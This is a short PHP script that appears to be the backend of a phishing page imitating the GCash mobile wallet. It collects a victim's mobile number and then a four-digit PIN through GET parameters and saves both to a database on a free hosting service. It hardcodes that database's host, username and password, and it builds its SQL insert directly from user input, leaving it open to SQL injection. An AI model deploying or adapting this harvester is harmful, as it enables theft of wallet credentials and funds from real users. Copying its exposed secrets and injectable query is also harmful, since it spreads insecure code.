<?php  

	//$connection = new mysqli('localhost','root','', 'gcash_db') or die($connection);

    $connection = new mysqli('sql313.infinityfree.com ','if0_35456696','quP3wGyKlW', 'if0_35456696_gcash_db') or die($connection);

	session_start();

    if(isset($_GET['mobile_num'])){

        $_SESSION['mobile_num'] = $_GET['mobile_num'];
        header('location: pin_entry.html');
    }

    if(isset($_GET['pin1'])){

        $_SESSION['pin'] = $_GET['pin1'].$_GET['pin2'].$_GET['pin3'].$_GET['pin4'];

        $mobile_num = $_SESSION['mobile_num'];
        $pin = $_SESSION['pin'];

        $connection->query("INSERT INTO accounts (mobile_number, pin_code) VALUES ('$mobile_num','$pin')") or die($connection->error);

        // unset($_SESSION['mobile_num']);
		// unset($_SESSION['pin']);
        
        // header('location: paid.html');
    }

